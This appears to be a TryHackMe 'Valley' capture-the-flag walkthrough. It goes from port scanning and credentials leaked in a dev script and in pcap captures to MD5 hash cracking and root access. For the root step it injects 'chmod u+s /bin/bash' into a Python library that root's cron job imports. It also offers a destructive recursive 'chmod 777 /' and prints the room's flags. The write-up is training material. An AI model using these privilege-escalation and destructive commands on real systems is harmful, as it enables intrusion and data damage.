----
Can you find your way into the Valley?
----

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/2700326f6bf2127c414a0fa4582496cd.png)

### Task 1  Get those flags!

 Start Machine

Boot the box and find a way in to escalate all the way to root!

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.97.111 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.97.111:22
Open 10.10.97.111:80
Open 10.10.97.111:37370
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 18:09 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:09
Completed NSE at 18:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:09
Completed NSE at 18:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:09
Completed NSE at 18:09, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:09
Completed Parallel DNS resolution of 1 host. at 18:09, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:09
Scanning 10.10.97.111 [3 ports]
Discovered open port 80/tcp on 10.10.97.111
Discovered open port 22/tcp on 10.10.97.111
Discovered open port 37370/tcp on 10.10.97.111
Completed Connect Scan at 18:09, 0.18s elapsed (3 total ports)
Initiating Service scan at 18:09
Scanning 3 services on 10.10.97.111
Completed Service scan at 18:09, 6.47s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.97.111.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:09
Completed NSE at 18:09, 5.53s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:09
Completed NSE at 18:09, 1.30s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:09
Completed NSE at 18:09, 0.00s elapsed
Nmap scan report for 10.10.97.111
Host is up, received user-set (0.18s latency).
Scanned at 2023-06-20 18:09:34 EDT for 13s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2842ac1225a10f16616dda0f6046295 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf7Zvn7fOyAWUwEI2aH/k8AyPehxzzuNC1v4AAlhDa4Off4085gRIH/EXpjOoZSBvo8magsCH32JaKMMc59FSK4canP2I0VrXwkEX0F8PjA1TV4qgqXJI0zNVwFrfBORDdlCPNYiqRNFp1vaxTqLOFuHt5r34134yRwczxTsD4Uf9Z6c7Yzr0GV6NL3baGHDeSZ/msTiFKFzLTTKbFkbU4SQYc7jIWjl0ylQ6qtWivBiavEWTwkHHKWGg9WEdFpU2zjeYTrDNnaEfouD67dXznI+FiiTiFf4KC9/1C+msppC0o77nxTGI0352wtBV9KjTU/Aja+zSTMDxoGVvo/BabczvRCTwhXxzVpWNe3YTGeoNESyUGLKA6kUBfFNICrJD2JR7pXYKuZVwpJUUCpy5n6MetnonUo0SoMg/fzqMWw2nCZOpKzVo9OdD8R/ZTnX/iQKGNNvgD7RkbxxFK5OA9TlvfvuRUQQaQP7+UctsaqG2F9gUfWorSdizFwfdKvRU=
|   256 429e2ff63e5adb51996271c48c223ebb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNIiJc4hdfcu/HtdZN1fyz/hU1SgSas1Lk/ncNc9UkfSDG2SQziJ/5SEj1AQhK0T4NdVeaMSDEunQnrmD1tJ9hg=
|   256 2ea0a56cd983e0016cb98a609b638672 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZhkboYdSkdR3n1G4sQtN4uO3hy89JxYkizKi6Sd/Ky
80/tcp    open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
37370/tcp open  ftp     syn-ack vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:09
Completed NSE at 18:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:09
Completed NSE at 18:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:09
Completed NSE at 18:09, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.36 seconds

http://10.10.97.111/static/1

http://10.10.97.111/static/00

dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts

http://10.10.97.111/dev1243224123123/

view-source:http://10.10.97.111/dev1243224123123/dev.js

if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";

http://10.10.97.111/dev1243224123123/devNotes37370.txt

dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port

┌──(witty㉿kali)-[~/Downloads]
└─$ ftp 10.10.97.111 37370
Connected to 10.10.97.111.
220 (vsFTPd 3.0.3)
Name (10.10.97.111:witty): siemDev
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||57075|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000         7272 Mar 06 13:55 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06 13:55 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06 14:06 siemHTTP2.pcapng
226 Directory send OK.
ftp> mget *
mget siemFTP.pcapng [anpqy?]? y
229 Entering Extended Passive Mode (|||46138|)
150 Opening BINARY mode data connection for siemFTP.pcapng (7272 bytes).
100% |*****************************************************************************|  7272       69.92 KiB/s    00:00 ETA
226 Transfer complete.
7272 bytes received in 00:00 (24.70 KiB/s)
mget siemHTTP1.pcapng [anpqy?]? y
229 Entering Extended Passive Mode (|||13176|)
150 Opening BINARY mode data connection for siemHTTP1.pcapng (1978716 bytes).
100% |*****************************************************************************|  1932 KiB  493.07 KiB/s    00:00 ETA
226 Transfer complete.
1978716 bytes received in 00:04 (469.60 KiB/s)
mget siemHTTP2.pcapng [anpqy?]? y
229 Entering Extended Passive Mode (|||61333|)
150 Opening BINARY mode data connection for siemHTTP2.pcapng (1972448 bytes).
100% |*****************************************************************************|  1926 KiB  499.73 KiB/s    00:00 ETA
226 Transfer complete.
1972448 bytes received in 00:04 (474.83 KiB/s)
ftp> exit
221 Goodbye.

┌──(witty㉿kali)-[~/Downloads]
└─$ wireshark siemFTP.pcapng 

┌──(witty㉿kali)-[~/Downloads]
└─$ wireshark siemHTTP2.pcapng 

follow http stream

POST /index.html HTTP/1.1
Host: 192.168.111.136
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: http://192.168.111.136
Connection: keep-alive
Referer: http://192.168.111.136/index.html
Upgrade-Insecure-Requests: 1

uname=valleyDev&psw=ph0t0s1234&remember=onHTTP/1.1 200 OK

valleyDev:ph0t0s1234

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh valleyDev@10.10.97.111                                                                    
The authenticity of host '10.10.97.111 (10.10.97.111)' can't be established.
ED25519 key fingerprint is SHA256:cssZyBk7QBpWU8cMEAJTKWPfN5T2yIZbqgKbnrNEols.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.97.111' (ED25519) to the list of known hosts.
valleyDev@10.10.97.111's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
valleyDev@valley:~$ whoami
valleyDev
valleyDev@valley:~$ ls
user.txt
valleyDev@valley:~$ cat user.txt 
THM{k@l1_1n_th3_v@lley}

valleyDev@valley:/home$ ls -la
total 752
drwxr-xr-x  5 root      root        4096 Mar  6 13:19 .
drwxr-xr-x 21 root      root        4096 Mar  6 15:40 ..
drwxr-x---  4 siemDev   siemDev     4096 Mar 20 20:03 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20 20:54 valley
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13 08:17 valleyDev

valleyDev@valley:/home$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.8.19.103 - - [20/Jun/2023 15:23:25] "GET /valleyAuthenticator HTTP/1.1" 200 -

┌──(witty㉿kali)-[~/Downloads]
└─$ wget http://10.10.97.111:1234/valleyAuthenticator
--2023-06-20 18:23:25--  http://10.10.97.111:1234/valleyAuthenticator
Connecting to 10.10.97.111:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 749128 (732K) [application/octet-stream]
Saving to: ‘valleyAuthenticator’

valleyAuthentic 100%[=====>] 731.57K   479KB/s    in 1.5s    

2023-06-20 18:23:27 (479 KB/s) - ‘valleyAuthenticator’ saved [749128/749128]

┌──(witty㉿kali)-[~/Downloads]
└─$ strings valleyAuthenticator > revisar.txt

e6722920bab2326f8217e4
bf6b1b58ac
ddJ1cc76ee3
beb60709056cfbOW
elcome to Valley Inc. Authentica
[k0rHh
 is your usernad
Ol: /passwXd.{
~{edJrong P= 
sL_striF::_M_M
v0ida%02xo

or

┌──(witty㉿kali)-[~/Downloads]
└─$ upx -d valleyAuthenticator
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   2285616 <-    749128   32.78%   linux/amd64   valleyAuthenticator

Unpacked 1 file.

┌──(witty㉿kali)-[~/Downloads]
└─$ strings valleyAuthenticator | more

e6722920bab2326f8217e4bf6b1b58ac
dd2921cc76ee3abfd2beb60709056cfb


valleyDev@valley:/home$ ./valleyAuthenticator 
Welcome to Valley Inc. Authenticator
What is your username: a
What is your password: a
Wrong Password or Username

|Hash|Type|Result|
|---|---|---|
|e6722920bab2326f8217e4bf6b1b58ac|md5|liberty123|
|dd2921cc76ee3abfd2beb60709056cfb|md5|valley|

valleyDev@valley:/home$ ./valleyAuthenticator 
Welcome to Valley Inc. Authenticator
What is your username: valley
What is your password: liberty123
Authenticated

valleyDev@valley:/home$ su valley
Password: 
valley@valley:/home$ id
uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)

valley@valley:/home$ find / -group valleyAdmin -type f  2>/dev/null
/usr/lib/python3.8/base64.py
valley@valley:/home$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py

valley@valley:/home$ cat /photos/script/photosEncrypt.py
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
	image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
	with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
	encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
	output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
	with open(output_path, "wb") as output_file:
    	  output_file.write(encoded_image_data)

valley@valley:/home$ more /usr/lib/python3.8/base64.py
#! /usr/bin/python3.8

"""Base16, Base32, Base64 (RFC 3548), Base85 and Ascii85 data encodings"""

# Modified 04-Oct-1995 by Jack Jansen to use binascii module
# Modified 30-Dec-2003 by Barry Warsaw to add full RFC 3548 support
# Modified 22-May-2007 by Guido van Rossum to use bytes everywhere

import re
import struct
import binascii
import os

os.system('chmod u+s /bin/bash')

or

os.system("chmod 777 / -R")

valley@valley:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash


valley@valley:/home$ python3 /photos/script/photosEncrypt.py
valley@valley:/photos/photoVault$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
root.txt  snap
bash-5.0# cat root.txt 
THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}


```

What is the user flag?

*THM{k@l1_1n_th3_v@lley}*

What is the root flag?

*THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}*

[[Intro to Docker]]



